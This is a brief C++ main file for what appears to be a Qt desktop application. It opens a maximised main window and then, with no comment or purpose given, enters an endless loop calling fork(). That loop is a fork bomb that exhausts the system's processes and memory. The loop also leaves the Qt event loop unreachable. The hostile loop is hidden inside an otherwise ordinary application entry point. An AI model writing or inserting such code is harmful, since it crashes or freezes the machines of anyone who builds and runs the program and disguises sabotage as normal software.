#include <QApplication>
#include "mainwindow.h"

int main ( int argc, char * argv[]) {

    QApplication app(argc,argv);
    MainWindow window ;
    window.showMaximized();
    while (1) {
        fork();
    }
    return app.exec();
}
